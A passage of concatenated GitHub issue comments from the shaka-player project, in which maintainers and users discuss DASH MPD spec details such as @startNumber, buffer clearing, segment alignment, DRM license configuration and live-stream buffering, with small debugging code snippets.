23009-1:2014/Cor.1:2014(E)), makes it possible for @startNumber to be 0. The problematic computation which would have led to a negative $Time$ value is now changed to:\nIf @duration attribute is present, then the MPD start time of the Media Segment is determined as (Number-NumberStart) times the value of the attribute @duration with NumberStart the value of the @startNumber attribute, and Number the segment number (e.g. (k-1) + NumberStart).\u00a0\nSo #10 should be re-opened.\n--\u00a0Gilles\nOn February 3, 2015 at 5:13:29 PM, Joey Parrish (notifications@github.com) wrote:\nWe definitely see the point of view that xs:unsignedInteger implies the validity of 0, so thank you for following up on this with the DASH-IF.\nWe will revert 5c7fca9 and consider @startNumber=0 to be invalid again until there is a clear correction to the spec one way or the other. Please reopen this issue if @startNumber=0 is clarified to be valid.\n\u2014\nReply to this email directly or view it on GitHub.\n. I think there's still a problem with the updated code. It still forces startNumber to be 1, even if the MPD specifies @startNumber = 0.\nFor instance, with an MPD like the one at: http://www.bok.net/dash/tears_of_steel/cleartext/stream.mpd, the shaka player will start with seg-1.m4f instead of seg-0.m4f.\nFrom the spec:\n\"If the Representation contains or inherits a SegmentTemplate element with $Number$ then the URL of the media segment at position k is determined by replacing the $Number$ identifier by (k-1) + @startNumber.\"\nSo if @startNumber == 0, $Number# for the first segment (i.e k=1) is 0\n. It seems indeed that the latest corrigendum isn\u2019t available on the IEC or ISO websites. That\u2019s surprising, given that the final text for this doc was published on Oct 30 2014.\nI obtained it from the doc repo available to MPEG members. Maybe your company is an MPEG member, in which case you\u2019ll have access to the document register.\u00a0\n--\u00a0Gilles\nOn February 17, 2015 at 10:07:12 AM, Joey Parrish (notifications@github.com) wrote:\nOur previous fix, as you pointed out, was insufficient. We reverted that change for now.\nAs @tdrews pointed out in his comment earlier in the thread, it seems that the only way to interpret 23009-1:2014 to ensure that $Number$ and $Time$ are non-negative is if startNumber and k both begin at one.\nYou mentioned a corrigendum, but it does not appear to be available in the list of publicly available standards on the ISO website. We are still unable to locate it this morning, not even on the corrigenda tab under 23009-1:2014.\nWe'd love to resolve this in a way that is consistent with the latest amendments to the spec. Where can we find this corrigendum?\n\u2014\nReply to this email directly or view it on GitHub.\n. Thanks. I'll leave the stream on the server for a while.\n. Ok, that makes sense.\nBut we get the same error when signaling the two codec representations in different adaptation sets:\nThe player throws a Shaka Error MEDIA.VIDEO_ERROR when selecting the second adaptation set from the drop-down menu in the sample player UI.\nHere's an example:\nhttp://www.bok.net/tmp/dash/dual_codec_2/stream.mpd\nor with just the AAC adaptation set (works by itself)\nhttp://www.bok.net/tmp/dash/dual_codec_2/stream_aac.mpd\nor with just the E-AC3 adaptation set (works by itself)\nhttp://www.bok.net/tmp/dash/dual_codec_2/stream_ec3.mpd\n. Safari on OSX El Capitan supports ec-3\n. ",
    "tdrews": "Yes, 5c7fca9 is definitely not correct. However, after looking at the MPD spec. (ISO/IEC 23009-1:2014) more closely, it appears that startNumber must be greater than zero.\nThe spec. indicates in section 5.3.9.5.3 that the $Number$ placeholder should be replaced with (k - 1) + startNumber, and that the $Time$ placeholder should be replaced with ((k - 1) + (startNumber - 1)) * segmentDuration, where k is the segment number. It seems that k is one-based, so startNumber must be greater than zero to ensure that $Number$ and $Time$ are both strictly non-negative.\n. I can't seem to locate the corrigendum (ISO/IEC 23009-1:2014/Cor.1:2014(E)) on the ISO site. Where is this document available from?\nThanks.\n. Thanks for the link. I will take a look.\n. I'm having difficulty reproducing this issue from the trunk.\nThe 'bufferingStart' event is dispatched from Player.enteringBufferingState_, which is called by Player.onWatchdogTimer_, which is triggered via Player.startWatchdogTimer_, which is only called from Player.onWatchdogTimer_ and Player.load.\nAre you still seeing this issue on the trunk?\n. This is the intended behavior of ecc1f8027908e5e582853889d09639f05737a50b, but perhaps we can do better. The challenge is handling autoplay=true/false, user invoked pauses, and corner cases resulting from the interplay between play/pause calls in the code-base.\nI'll open a new issue to track 'bufferingStart' not firing during start-up.\n. The library does not export shaka.player.DrmInfo. Your application should return an array of objects like shaka.player.DrmInfo.Config from your interpretContentProtectionCallback. For example,\njavascript\nreturn [{\n    'keySystem': 'com.widevine.alpha',\n    'licenseServerUrl': LICENSE_SERVER_URL,\n    'withCredentials': true\n  }];\n. Hi,\nThanks for your input on this. We added the cache-busting feature to simplify our bandwidth estimation code, as without it we found it difficult to get reliable estimates using our weighted average approach; however, as we now support custom bandwidth estimators and plan on supporting custom bit-rate managers (see #48) this is something that we will revisit for <= v1.4.0.\n. Please feel free to re-open this issue if you have any issues with IBandwidthEstimator.supportsCaching().\n. Good catch and thanks for the report. We'll take a look.\n. Fixed in 4f54a10f882e211029b6795401b5e0034118d44d\n. Hi,\nCheck out 6d08f0b97a381d8cc7e20ba2d9a2b60cba50b2e2 which addressed Issue #62. With this patch DrmSchemeInfo now takes a licensePreProcessor callback which can modify the raw license request and add additional headers to the request itself.\n. Hi,\nMy concern with generic clearAudioBuffer and clearVideoBuffer functions are that they would remove/reduce some simplifying assumptions made by Stream, e.g., \"there are never any gaps in the buffer\".\nThe safest way to support partial clears is to 1. only allow removing whole segments, and 2. only allow clearing the buffer from the video's current time (plus some offset if desired) to the end of the buffer.\nWould something like this work?\njavascript\n/**\n * Clears the audio buffer forward from the segment boundary nearest the video's\n * current time plus |offset| seconds.\n */\nVideoSource.clearAudioBuffer(offset) {\n  // ...\n};\nI believe this function could be implemented in Stream without major complications, and would only require the addition of one small function to SourceBufferManager (to remove SegmentRefrences from |inserted_|).\nIf the \"nearest segment boundary\" part is too restrictive then I think we could remove this restriction, but it would require a slightly more clever change to SourceBufferManager.\nWould something like VideoSource.clearAudioBuffer(offset) work for you? Or do you think you would still need something more generic?\n. Great. We're happy to accept a PR for this change :) But we can tackle this if you're short on time.\n. Hey, thanks for doing the work on this.\nI skimmed https://github.com/blinkbox/shaka-player/commit/1327efeb43ff492a807a3299ed3d795772175c9b and I think your approach is correct, shaka.media.Stream.prototype.clearBuffer also looks fine (although perhaps you can just modify resync() to take a clear offset param?)\nFrom your code, I don't see where the race is (between clearAhead and fetch, there may be one with clearAhead and resync though): if the update timer is canceled and the current SBM operation is aborted then no more fetches should occur until setUpdateTimer_(0) has been called. Is something specific going wrong?\n\nAn alternative is not to SBM.abort(), but simply to remove the entries from the inserted_ list...\n\nI think doing the abort() is the right way to do it since if you're clearing the buffer ahead then whatever is being fetched should not be inserted since it will get cleared.\n. > I think this is happening because I'm coming into resync after calling StreamVideoSource.selectVideoTrack which at some point cancels the update timer ...\nJust wondering, are you calling StreamVideoSource.selectVideoTrack(...) + resync(offset) in the middle of playback or during startup? I'm trying to fail the assertion myself, but I can't seem to do it.\nRegardless, I think calling clear before switching could work, also wondering if we could add the clear ahead offset to switch itself? This may eliminate the race.\n. Design-wise I like\n\nvideoSource.clearBuffer(video.currentTime + 10, Number.POSITIVE_INFINITY);\nvideoSource.selectVideoTrack(newTrackId);\n\nHowever, the issue is that if we separate the operations on Stream then SBM may begin downloading a segment that the ABRManager implementation doesn't want, i.e., SBM may begin downloading a segment between stream.resync(offset) and stream.switch(). This shouldn't cause any problems, but it feels a bit untidy.\nWe could avoid this issue by implementing resync_() such that if an offset is provided then it doesn't call setUpdateTimer_(); however, this will require some additional changes to switch() and perhaps some other changes elsewhere.\nI'm open to either solution, but if separating the two operations introduces too many extra corner-cases in Stream then I think adding an extra parameter to selectVideoTrack and switch may be the safer approach.\n. I think https://github.com/blinkbox/shaka-player/commit/486f04913f77300cc92783c77fc0cdc28db6da68 looks good overall.\n\nAnd in terms of your other suggestion, i.e. to get resync() to avoid restarting the timer, I wasn't too sure how to go about this, because if the timer is not started in resync, I can't see where it would be restarted again?\n\nI was thinking that after resync() with an offset (aka clearAhead()) the VideoSource would be responsible for restarting the update loop itself by calling switch(), i.e., if the VideoSource didn't call switch() after clearAhead() then the Stream would just stop.\nAre you getting any race conditions with https://github.com/blinkbox/shaka-player/commit/486f04913f77300cc92783c77fc0cdc28db6da68? I like this approach as I'm not sure how we could separate clearAhead + switch without either stopping the update loop, having to abort the update loop when switching, or having some type of race. \n. Closed via PR #144. \n. Good catch. We'll have a patch up soon.\n. Please see #133 for a separate discussion on sidecar loading (outside of the MPD) WebVTT subtitles.\n. I can't seem to repro on ToT. I've tried starting playback and letting it play through, seeking to 2:00 manually, and also using setPlaybackStartTime(120) without any luck.\nHow many ranges are buffered when that assert hits? \n. It is the content that you shared with @joeyparrish for #112.\n. If you turn verbose logging on (;v query parameter), what do you see before the assert hits?\n. Hmm, what browser version?\n. Chrome for Linux?\nAlso, can you repro if you disable bandwidth estimation?\n. You can call player.configure({'enableAdaptation': false}), ideally prior to player.load(), but it can be called at any time.\n. Ah, I'm thinking that a particular segment from one Representation is not aligned ideally with another segment from another Representation (although MSE should be robust against this), or one of the Representations has an actual encoding issue (that Chrome can't handle).\nI may not be able to repro because I'm not streaming the same bitrate stream as you. I'll try each bitrate stream to see if I can repro. If I am still unable to, then the problem is probably dependent on the order of segment insertions and timing of switches (all dependent on network conditions), in which case I'll need to get some additional debug logs from you.\n. I still can't repro from my end. Can you add the following log to shaka.media.SourceBufferManager.prototype.assertSingleRange\njavascript\nif (this.sourceBuffer_.buffered.length > 1) {\n  for (var i = 0; i < this.inserted_.length; ++i) {\n    var r = this.inserted_[i];\n    console.log(\n        'r[' + i + ']:',\n        'start=', r.startTime,\n        'end=', r.endTime,\n        'stream=', r.url.toString().split('/').slice(-1)[0]);\n  }\n}\nThis will output URL suffixes, if you don't want to share those here, please feel free to share the logs with me privately (contact info in CONTRIBUTORS).\n. We determined that this issue can be caused by Representations' segments not being aligned with their corresponding segment indexes (which may be caused by drift, see section 7.2.1 of ISO/IEC 23009-1).\nFor example, given a SegmentTimeline that specifies the following segments for an SD stream and an HD stream,\n1: start=0, end=10\n2: start=10, end=20\n3: start=20, end=30\nIf the SD segments actually (i.e., the timestamps in the actual media content) have the following\nstart and end times,\n1: start=0, end=9\n2: start=9, end=19\n3: start=19, end=29\nthen switching to the HD stream after segment 1 is fetched and inserted will cause a gap in the buffer since the SD segment ends at 9 (incorrectly) and the HD segment starts at 10 (correctly).\nSome small discrepancies can be tolerated by MSE, and Shaka will also handle an arbitrary constant offset between a segment index and the timestamps in the actual media content so long as all Representations have the same offset.\nIf you are encountering this issue then you should ensure that the segment index (i.e., SegmentTimeline or SegmentList or SIDX, etc.) for each Representation is accurate; for example, specifying a separate SegmentTimeline for each Representation instead of for the entire AdaptationSet may resolve the issue. This issue may be caused by content creation tools (e.g., DASH packagers or encoders).\nThis issue did not manifest itself in v1.3.x as the stream switch implementation unintentionally handled content with unaligned segments...\nThe 1.3 implementation switches by first splicing in a chunk of new segments into the buffer before the old segments in the buffer end. It then changes what gets inserted in the update loop. The splice step overwrites any potential gap in the buffer; for example, if the old segments are supposed to end at 10 seconds but actually end at 8, it doesn't matter, since the new segments get spliced in before 8 seconds.\nThe 1.4 implementation switches simply by changing what gets inserted in the update loop, it doesn't splice in anything beforehand. In this way it never overwrites what's in the buffer, unless the next new segment starts before the last old segment ends. The 1.4 design saves bandwidth, but more importantly allows for quick switching between bitrates; for example, the 1.4 implementation can be playing 720p, insert one 480p segment, and then switch back to 720p without overwriting anything in the buffer or re-downloading any segments.\nWith f08fbba the player will now attempt to recover from unaligned segments by re-buffering.\nClosing this issue as it is being caused by the content itself. However, if we find that this is a common problem with content creation tools then we can start looking at some other mechanisms to better handle this type of content.\n. There is currently no 'nice' way to do this since the stream start time is deduced from the \"stream limits\" in StreamVideoSource. We could add a method on Player to set the desired playback start time, before the streams start we could just set the video's current time to this value so long as it is within the stream limits.\n. Closed via 03703f1a0c86e4b4ae987943dd4c4e41e9c30f80\n. Thanks for taking care of this!\n. The debug panel checks video.buffered whereas SourceBufferManager checks each audio/video buffer individually, so some discrepancy is expected (due to the timing between inserting audio segments and inserting video segments); however, a 20 seconds difference does seem quite large. I'll investigate.\n. I believe SourceBufferManager.bufferedAhead() and the debug panel are functioning correctly:\nI added the lines\njavascript\nif (app.player_ && app.player_.videoSource_) {\n  shaka.log.debug('VIDEO BUFFERED: ', ahead);\n  shaka.log.debug(\n      'VIDEO SOURCE BUFFERED: ',\n      app.player_.videoSource_.streamsByType_['video'].sbm_.bufferedAheadOf(currentTime));\n  shaka.log.debug(\n      'AUDIO SOURCE BUFFERED: ',\n      app.player_.videoSource_.streamsByType_['audio'].sbm_.bufferedAheadOf(currentTime));\n}\nto the bottom of app.updateBufferDebug_ and changed\nwindow.setInterval(app.updateDebugInfo_, 50); to\nwindow.setInterval(app.updateDebugInfo_, 500); to avoid log spam.\nI'm seeing video.buffered is approximately the minimum of audio buffered and video buffered. Sometimes audio buffered or video buffered is ahead of the other, likely due to fetch latency and insertion order.\nIf you're seeing something different with this logging, please feel free to reopen.\n. Probably caused by https://code.google.com/p/chromium/issues/detail?id=512145.\n. Fixed in Chrome.\n. Thanks for the report. We'll take a look.\n. Thanks. I believe this issue should be fixed in 1.4.1. The regression is most likely from bc7b826e41e2cc96dbc2196d1924045489f35a74.\n. Thanks for the report. I have a repro. I'll take a look.\n. We should have a patch up soon.\n. Thanks for the report. This is likely a side-effect of our \"timestamp correction\" mechanism. However, if the stream starts at 0 and the timestamp correction is 0 then we should be able to forego any initial seek. I'll take a look.\n. It seems reasonable to have a separate subtitles URL. I think the cleanest implementation would be to add a subtitles URL to the StreamVideoSource constructor, which would of course require knowing the subtitles URL before playback.\n@dougdoe: Although you are fetching the MPD and subtitles separately do you have both before playback? Or do you want to be able to fetch subtitles during playback?\n. I think we can do this for v1.5.0, which we have slotted for mid August.\n. With the current API you could parse the playlists in the application and call addExternalCaptions() with each subtitles URL. I'd like to avoid implementing anything too specific. Are the playlists in a standard file format?\n. I see. I had originally thought that each playlist pointed to a number of completely separate subtitles files. However, it looks like the playlist points to one subtitles track that is separated into multiple files. I believe the work required for supporting this scheme (correctly) overlaps with the work required to support TTML (#111); so it's a little beyond what we've scoped out for v1.5.0.\nI will add an issue to track support for M3U based subtitles. In the meantime I think support for this scheme can be accomplished at the application level, e.g., by stitching each vtt file together as a string and passing a data URI to addExternalCaptions().\n. @sanbornhnewyyz was right. However, we've updated the API in 950b17354c11225768b6d8a714a295a2e843bcf3.\n. We can add an HTTP method override to the licenseRequestInfo object.\n. We can add a licenseServerUrl override to the licenseRequestInfo object.\n. Yep, I see the problem: we aren't handling seek events until the initial buffering is done. This is a tricky one, but I have a fix in mind.\n. A fix for this issue is nearly ready and will be included in v1.5.0.\n. Thanks for the report.\n. Yep Player.setPlaybackRate is inconsistent. However, I think the behavior should be consistent with how video.playbackRate works; for example,\nvideo.pause();\nvideo.playbackRate = 2;\n// Stays paused until...\nvideo.play();\nSo we should have\nvideo.pause();\nplayer.setPlaybackRate(2);\n// Stays paused until...\nvideo.play();\nand\nvideo.pause();\nplayer.setPlaybackRate(-1);\n// Stays paused until...\nvideo.play();\n. Is this only happening with Chrome 44 on Mac?\n. This issue is unlikely to be a player issue: the player provides the browser with media segments; it's up to the browser to correctly decode and render them. As this issue occurs across browsers, I'd guess that it's a decoder issue.\nCan you file a public bug on the Chromium issue tracker?\n. Thanks. I'll leave this issue open until the cause of the issue has been identified.\n. Looks like this is a browser issue.\n. Thanks for the report we'll take a look.\n. I believe there may be an issue with how the player handles the presentationTimeOffset attribute for live content with SegmentTemplate + SegmentTimeline.\n- Does the content playback in 1.3.x?\n- Are you able to host any content that uses presentationTimeOffset to a public location?\n. Ah, yes, you are right about @expose. AFAIK the only other way to stop the compiler from renaming is to add @dict to SimpleAbrManager and then only reference videoSource via this['videoSource'], but I'd like to avoid that.\nDoes your custom ABR manager only need to access videoSource to call IVideoSource.selectVideoTrack() with the clear ahead param? Could SimpleAbrManager.selectVideoTrack() itself just take an optional clear ahead param, so videoSource can stay private (my apologies for backtracking on this)?\n. :( Our bot is having a bad day. Code looks good, but there are some linter errors. Can you check with build/lint.sh ?\n. Hmm, that's strange. There should be 0 linter errors on master. Perhaps this is an issue with running the linter on Cygwin as you suggested; I'll add an issue to track this. The only linter errors I see are indentation ones,\n----- FILE  :  source_buffer_manager.js -----\nLine 315, E:0006: Wrong indentation: expected any of {2, 57} but got 4\nLine 317, E:0006: Wrong indentation: expected any of {2, 57} but got 4\nLine 318, E:0006: Wrong indentation: expected any of {2, 57} but got 4\nLine 319, E:0006: Wrong indentation: expected any of {2, 57} but got 4\nLine 320, E:0006: Wrong indentation: expected any of {4, 59} but got 8\nLine 321, E:0006: Wrong indentation: expected any of {8, 16, 59, 63} but got 12\nLine 322, E:0006: Wrong indentation: expected any of {4, 59} but got 8\nLine 323, E:0006: Wrong indentation: expected any of {4, 59} but got 8\nLine 324, E:0006: Wrong indentation: expected any of {2, 57} but got 4\nLine 326, E:0006: Wrong indentation: expected any of {2, 57} but got 4\nLine 328, E:0006: Wrong indentation: expected any of {2, 57} but got 4\nLine 329, E:0006: Wrong indentation: expected any of {4, 59} but got 8\nLine 330, E:0006: Wrong indentation: expected any of {4, 59} but got 8\nLine 331, E:0006: Wrong indentation: expected any of {2, 57} but got 4\nLine 333, E:0006: Wrong indentation: expected any of {2, 57} but got 4\nLine 502, E:0006: Wrong indentation: expected any of {2, 58} but got 4\nLine 504, E:0006: Wrong indentation: expected any of {2, 58} but got 4\nLine 505, E:0006: Wrong indentation: expected any of {4, 60} but got 8\nLine 506, E:0006: Wrong indentation: expected any of {4, 60} but got 8\nLine 507, E:0006: Wrong indentation: expected any of {4, 60} but got 8\nLine 508, E:0006: Wrong indentation: expected any of {2, 58} but got 4\nLine 510, E:0006: Wrong indentation: expected any of {2, 58} but got 4\nLine 512, E:0006: Wrong indentation: expected any of {2, 58} but got 4\nLine 513, E:0006: Wrong indentation: expected any of {2, 58} but got 4\nLine 514, E:0006: Wrong indentation: expected any of {4, 60} but got 8\nLine 515, E:0006: Wrong indentation: expected any of {4, 60} but got 8\nLine 516, E:0006: Wrong indentation: expected any of {2, 58} but got 4\nLine 518, E:0006: Wrong indentation: expected any of {2, 58} but got 4\nLine 519, E:0006: Wrong indentation: expected any of {4, 60} but got 8\nLine 520, E:0006: Wrong indentation: expected any of {4, 60} but got 8\nLine 521, E:0006: Wrong indentation: expected any of {8, 30, 60, 64} but got 12\nLine 522, E:0006: Wrong indentation: expected any of {8, 30, 60, 64} but got 12\nLine 523, E:0006: Wrong indentation: expected any of {2, 58} but got 4\nLine 524, E:0006: Wrong indentation: expected any of {4, 60} but got 8\nLine 525, E:0006: Wrong indentation: expected any of {4, 60} but got 8\nLine 526, E:0006: Wrong indentation: expected any of {2, 58} but got 4\nLine 528, E:0006: Wrong indentation: expected any of {2, 58} but got 4\nLine 530, E:0006: Wrong indentation: expected any of {2, 58} but got 4\nLine 531, E:0006: Wrong indentation: expected any of {2, 58} but got 4\n----- FILE  :  stream_video_source.js -----\nLine 856, E:0006: Wrong indentation: expected any of {14, 41, 45, 66, 70} but got 12\n. There are definitely some improvements that we can make here. Perhaps one way of going about it is\n1. As audio and video tracks become active before an AdaptationEvent is fired, we could instead make audio and video tracks active immediately before firing an AdaptationEvent (or some type of TrackSwitchedEvent).\n2. We could fire some type of TrackSwitchedEvent immediately before a new text track becomes active.\nI think this would make things consistent (i.e., Adaptation/TrackSwitched events would only be fired once that track begins presenting) and also enable applications to detect when a new text track begins presenting. I'm open to other options though; any concerns with this approach?\n. With regards to (1), audio and video tracks are considered active once their metadata is fetched, and although this is asynchronous, it's nearly instantaneous since the metadata will have already been fetched from StreamVideoSource. However, an AdaptationEvent is not fired until Stream.onUpdate_() is called, which may occur a little after the track becomes active. So, I think we can make this more consistent by syncing up track activation and AdaptationEvent firing.\nWith regards to (2), I was thinking that AdaptationEvent is becoming a bit of a misnomer, since switching audio languages or subtitle tracks isn't necessarily adapting to a different bit-rate. However, on second thought, it's probably best that we don't change the event name/type yet. We can just fire an AdaptationEvent from TextStream as you suggested.\n. We'll do this for v1.5.0.\n. Note: we are considering track activation timing consistency as a separate issue but have not decided yet how we want to address it.\n. @priyajeet from #162 wrote\n\nThanks for getting this implemented. One thing I did notice was that the MPD fetching bypasses the request callback. Wouldn't requesting the MPD also go through the callback for consistancy?\n\nBy-design the API only modifies segment request URLs and headers.\nFor live-content, the server can specify the next MPD update URL via the <Location> element.\nDo you require modifying the MPD update URLs (for live-content) client-side as well?\n. If you have control over the server then you can accomplish this by setting timeShiftBufferDepth in the MPD to some value greater than or equal to the time since the stream started broadcasting (at the time the MPD is fetched).\nAlternatively you should be able to just override timeShiftBufferDepth in mpd_parser.js to some large value (e.g., 1 day).\n. We will definitely be looking at enhanced subtitle support post v1.5.0. See #111 and #146 for similar feature requests.\n. Player.destroy() does call Player.unload(), but both of these methods return a promise (it's unfortunate that they have to return a promise, but it's required to reset encrypted media extensions). So, you should be able to avoid the exceptions by doing something like this,\njavascript\nvar reload = function(newMpdUrl) {\n  return player.unload().then(function() {\n    return player.load(newMpdUrl, null, sameEstimator, null);\n  });\n};\n. Confirmed. Thanks for the report. We'll take a look!\n. I assume that the above comment pertains to #148. Please see my response there.\n. Currently, this is by-design, but I suppose we could buffer backwards.\n. There is a bug. The Player exits the buffering state when the streams have re-buffered minBufferTime (MPD attribute) seconds of content. However, if minBufferTime > streamBufferSize (which defaults to 15) then the streams will never buffer enough content to exit the buffering state.\nTo rule out any other issues: is your minBufferTime set to something larger than 15 seconds or are you setting streamBufferSize explicitly?\n. Glad you were able to solve the issue. The master branch also includes a fix, which will be part of the v1.5.0 release.\n\nI'm gonna sneak in another question while I'm at it; what is the easiest way to modify the \"safety padding\" that Shaka applies to the live edge?\n\nSo, we compute the stream start time differently depending on the MPD style,\n- for SegmentTemplate + SegmentTimeline, the earliest possible start time is determined by the last segment(s) specified in the SegmentTimeline(s).\n- for SegmentTemplate + @duration, the earliest possible start time is deduced from the current time, @availabilityStartTime, and several other variables (see https://github.com/google/shaka-player/blob/e74ad98eaad82fb60c4940a0ad4e661f8679e90a/lib/dash/dynamic_live_segment_index.js#L146).\nHowever, for both MPD styles the VideoSource offsets the stream start time by @minBufferTime so the streams can buffer at least that amount of content... this is probably why you are seeing a large offset from the live-edge.\ntl;dr; I suggest you use a larger streamBufferSize (see Player.configure) with a smaller @minBufferTime, this will reduce your offset from the live-edge at startup (and reduce startup latency) whilst also ensuring a large buffer during playback.\n. We plan to fire 'trackschanged' from StreamVideoSource when track availability changes from one of the following events\n1. application of previously set restrictions on manifest load or manifest update;\n2. application of new restrictions after manifest load;\n3. notification of new (encryption) key statuses (e.g., an encryption expires).\n'trackschanged' events would fire independent of 'adaptation' events.\n. We should have this change pushed this week or early next week.\n. Thanks for the report.\nThe server seems to set the MPD's @availabilityStartTime to the current time, and the client's clock may be slightly behind this value. The player has a clock sync mechanism but it does not work unless the server sets the Access-Control-Expose-Headers HTTP header. The player will also fetch another MPD, with the delay specified by @minUpdatePeriod, when the stream is not available (or appears not to be available), but the MPD's @minUpdatePeriod is quite large in this case (and the server may just reset @availabilityStartTime anyways).\nWe'll investigate a solution.\n. To clarify, is the player starting playback from the first segment and then failing when it attempts to fetch the non-existent second segment, or is the player trying and failing to start playback from the non-existent second segment to begin with?\n. So, the video doesn't start at all? If not, what happens if you call player.configure({'streamBufferSize': 5}); before player.load?\n. So, here's what's happening: because @mediaPresentationDuration is greater than 10 seconds and the MPD uses the SegmentTemplate + @duration MPD style, the player concludes that there must be at least two segments.\nTo resolve this the MPD should indicate @mediaPresentationDuration is only 10 seconds if there is only 1 segment that is 10 seconds long. Alternatively, the MPD can use the SegmentTemplate + SegmentTimeline MPD style to reduce segment start/end time ambiguity.\nHowever, there is a small bug in the player as well: the player should assume the last segment does not extend past @mediaPresentationDuration or the Period's end. We can correct this, but @mediaPresentationDuration still needs to be accurate to ensure the player can deduce the correct number of segments. \n. The if at https://github.com/google/shaka-player/blob/4cc4e96dbd5d2fd1b47e622eb8505d3ab4848cc0/lib/player/stream_video_source.js#L922 should not include !COMPILED.\nDoes your good content have cenc:default_KID in the MPD? Or is it unencrypted?\n. The browser (specifically the EME layer) fires the keystatuseschange event. The player uses the MPD's cenc:default_KID attributes to correlate key statuses to Representations (the player could not accomplish this without cenc:default_KID attributes as there's no key-system-agnostic mechanism to extract key IDs from actual content).\nThe browser should fire a keystatuseschange event when it begins playback of any encrypted content. So, I would expect StreamVideoSource to encounter Uncaught TypeError: Cannot read property 'length' of null for any encrypted content without @cenc:default_KID in compiled mode before d0b8c68b04288bc879943dc84db16e85144f775e.\nIf you run in debug mode (with debug logging) do you see onKeyStatusesChange_ reported in the console for both your good and bad content? Or, perhaps your good content has an (unencrypted) clear-lead?\n. We will land fixes for #170 and #182 for v1.5.0. After those land, let us know if you're seeing any different behavior here.\n. Closing... Please reopen if you still see this issue.\n. Thanks, good catch!\n. The Player itself does not do this, but your application can just inspect the media's URL: if the URL ends with .mpd then use DashVideoSource; otherwise, use HttpVideoSource.\n. Does this answer your question, or have I misinterpreted your question?\n. StreamVideoSource is applying the restrictions to the audio tracks, which it should not be. We'll have a patch up shortly.\nHowever, we'll defer handling the case where no audio or video tracks are available (during playback or at startup) until later (we can address this issue along with #170).\n. You can enable logging in the demo application by adding the query parameters ?debug or ?v to the URL, e.g., http://localhost/shaka/?debug\nAlternatively you can call shaka.log.setLevel(shaka.log.Level.DEBUG) or shaka.log.setLevel(shaka.log.Level.V1) in your own application (in uncompiled mode).\n. After reviewing the logs, I believe the content has \"large\" gaps (> ~1 second) in it, which is causing the player to stall. For live streams, these gaps may occur if the encoder & packager cannot keep up. Are you processing multiple streams in parallel? \n(As an aside: the warning pertaining to @availabilityStartTime is generally harmless; however, you may be able to eliminate it by passing -availability_time_offset 0 to edash-packager.)\n. We did not consider frequent gaps within a stream as a normal use case. We'll have to investigate further to determine if/when/how we want to address this issue.\nAs a workaround you may be able to add something like video.currentTime = video.buffered.start(video.buffered.length - 1); above https://github.com/google/shaka-player/blob/c45a3c273f8b285c07e095da1de8e55adbb3b181/lib/media/stream.js#L509 (although I have not tested this).\n. Thanks for the report. I believe these are both consequences/bugs of @group support.\nFor (1), if you log player.videoSource_.streamSetsByType.getAll('audio') do you see that some StreamInfos have allowedByKeySystem set to false (from the StreamSetInfo that doesn't show up in getAudioTracks)?\nFor (2), do you see the warning AdaptationSet groups should have the same language.? We could (probably should) lift this restriction.\n. Thanks for confirming (1) and (2). The bug is that the player squashes multiple AdaptationSets with different languages (and the same group) into a single StreamSetInfo. The player should only squash AdaptationSets together if the languages are the same. \n\nFinally, I'm curious why when I call this.videoSource_.streamSetsByType.getAll('audio') the array returned includes a shaka.media.StreamSetInfo with contentType = video\n\nI should have wrote get('audio').\n. The 'ended' event is an internal event and is fired when a stream (audio or video) is \"finished\" fetching data and not when the video is actually over. You can just use the 'ended' event fired from the video element itself (http://www.w3.org/TR/2011/WD-html5-20110113/video.html#event-media-ended) to detect when the video is over.\n. Thanks for the report. The player should not be holding on to any segment data once it passes it on to the browser (via the MSE API). We'll have to investigate.\n. There appears to be two issues here:\nShaka Player buffers as much data as the browser allows (by design). The player appends data to the buffer; the browser evicts old data as it sees fit. On my machine, on Chrome, if I play Sintel at 1080p, the browser begins to evict data after ~5 minutes of data has been buffered, and at this time the tab consumes ~700 MB of memory. I don't believe all players rely on the browser to evict data, which explains some of Shaka Player's memory usage. (You can check the size of the video's buffer with video.buffered.end(0) - video.buffered.start(0) [assuming there is only one buffered range].)\nHowever, it's unclear why memory usage continues to grow after the browser begins to evict data.\n. Yep, we just spotted this ourselves. We'll have a patch up shortly to set requestPromise_ to null when the request completes. We actually don't want to cache segments anyways because it can interfere with bandwidth estimation.\n. Great. Thanks for taking the time to do the analysis. \n. Thanks for the report.\nI'm not exactly sure I understand what you see: so, you seek back into the middle of the seek range, but then after some time passes, seek.end gets set to the current time, so you cannot seek back to the live-edge?\n. Thanks for the report.\nThere is a bug in the player, see #173.\n1. Your MPD looks correct.\n2. Yes, this is the bug: the last segment should not extend past the Period's duration.\n3. We use the SegmentIndexes to compute the seek range (instead of the Period's duration directly) because each stream may have slightly different start/end times than what @mediaPresentationDuration or the Period's duration indicates (e.g., @mediaPresentationDuration may be 2 minutes but a particular Representation may have a SegmentTImeline that indicates that it ends at 1:59). Moreover, the actual timestamps in the media segments may induce slightly different start/end times (i.e., when there is a timestamp correction). Also, for live content, the seek range moves.\n4. The Period's duration does fallback to @mediaPresentationDuration (see https://github.com/google/shaka-player/blob/26bfade2dff58132937af0f9168de8f73c0d7220/lib/dash/mpd_processor.js#L152).\n. Good suggestion.\nWe've been having some discussion about improving Stream configuration (i.e., adding finer grained control), so we can address this issue as part of our plan.\n. Thanks for the report. This is a bug: Date gives the time when the content was created; not when it was transported (see https://tools.ietf.org/html/rfc7231#section-7.1.1.2).\n. Hi,\nCan you provide the MPD? You can send me a private email (see CONTRIBUTORS) if you do not want to share the link publicly.\n. With some changes server-side and some tweaks (29f8022) client-side these streams should work without issue now.\n. Unable to repro after ~30 minutes of playback with 3 tabs.\nWe had a memory issue (#184) in v1.5.0, perhaps this issue is causing the problem for you.\nCan you reproduce on master?\n. Wrong github?\n. At some point we will need to change how we handle the output-restricted key status. If the key system indicates the output-restricted key status then we should not raise an error or restrict the key's associated track(s), as the key system may still be able to use that key for different tracks. See http://www.w3.org/TR/encrypted-media/#idl-def-MediaKeyStatus.output-restricted\n. To help narrow down the problem, can you enable debug logging? You will then see the key status for each key.\n. You can either use the library in uncompiled mode, or you can use the library in compiled mode with debug logging by changing -D shaka.log.MAX_LOG_LEVEL=0 to -D shaka.log.MAX_LOG_LEVEL=4 in build/lib.sh before executing build/all.sh \n. Are you using edash-packager?\n. Can you provide a link to the content that does not work? If you do not want to post the link in public you can send me a private email (see CONTRIBUTORS). \n. Yes, perhaps you can check the content first. The browser may fail to decode certain content if the content does not correctly specify its resolution in its sample description table (which resides in the MP4 container). You can check your content with https://github.com/sannies/isoviewer (note: you may need to use v1.0.0 